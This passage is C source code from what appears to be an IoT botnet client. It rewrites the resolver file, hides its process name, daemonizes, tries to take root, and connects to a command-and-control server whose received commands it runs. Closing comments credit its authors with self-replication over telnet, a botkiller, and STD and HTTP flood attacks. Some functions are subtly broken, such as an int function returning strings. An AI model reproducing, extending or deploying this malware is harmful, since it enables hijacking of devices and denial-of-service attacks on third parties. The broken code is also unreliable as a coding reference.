        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
        size_t resl = strlen(resd);
        write(fhandler, resd, resl);
	} else { return; }
    close(fhandler);
}

int getEndianness(void)
{
	union
	{
		uint32_t vlu;
		uint8_t data[sizeof(uint32_t)];
	} nmb;
	nmb.data[0] = 0x00;
	nmb.data[1] = 0x01;
	nmb.data[2] = 0x02;
	nmb.data[3] = 0x03;
	switch (nmb.vlu)
	{
		case UINT32_C(0x00010203):
			return "BIG_ENDIAN";
		case UINT32_C(0x03020100):
			return "LITTLE_ENDIAN";
		case UINT32_C(0x02030001):
			return "BIG_ENDIAN_W";
		case UINT32_C(0x01000302):
			return "LITTLE_ENDIAN_W";
		default:
			return "UNKNOWN";
	}
}
char *getBuildz()
{
if(access("/usr/bin/python", F_OK) != -1){
return "SERVER";
} else {
return "DEVICE";
}
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int got = 1, total = 0;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got == 0 ? NULL : buffer;
}
int getOurIP() {
int sock = socket(AF_INET, SOCK_DGRAM, 0);
if(sock == -1) return 0;
struct sockaddr_in serv;
memset(&serv, 0, sizeof(serv));
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = inet_addr("8.8.8.8");
serv.sin_port = htons(53);
int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
if(err == -1) return 0;
struct sockaddr_in name;
socklen_t namelen = sizeof(name);
err = getsockname(sock, (struct sockaddr*) &name, &namelen);
if(err == -1) return 0;
ourIP.s_addr = name.sin_addr.s_addr;
int cmdline = open("/proc/net/route", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
if(strstr(linebuf, "\t00000000\t") != NULL)
{
unsigned char *pos = linebuf;
while(*pos != '\t') pos++;
*pos = 0;
break;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
if(*linebuf)
{
int i;
struct ifreq ifr;
strcpy(ifr.ifr_name, linebuf);
ioctl(sock, SIOCGIFHWADDR, &ifr);
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}
close(sock);
}
int main(int argc, char *argv[]) {
        const char *lolsuckmekid = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
		getOurIP();
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
		chdir("/");	
		setuid(0);				
		seteuid(0);
        signal(SIGPIPE, SIG_IGN);
        while(1) {
				if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; }
				sockprintf(mainCommSock, "\e[96m[%s] \e[97mConnected -> %s -> %s",getBuildz(), inet_ntoa(ourIP), getBuild(), getEndianness(), VERSION);
				UpdateNameSrvs();
				RemoveTempDirs();
				char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }
                        commBuf[got] = 0x00;
                        trim(commBuf);
                        if(strstr(commBuf, "PING") == commBuf) { // PING
                                continue;
                        }
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
                        unsigned char *message = commBuf;
                        if(*message == '!') {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;
                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;
                                while(pch) {
                                        if(*pch != '\n') {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1) {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++) {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
	}
}

//  BASE Client Made by Wicked
//  SelfRep Goes Into telnet.txt (say thanks to Seclusion for that)
//  Attacks, Ranges & Botkiller Improved by Scarface
//  Decent STD Flood By Scarface
//  Improved HTTP Flood By Scarface
//  Binarys & Ranges Added By By Scarface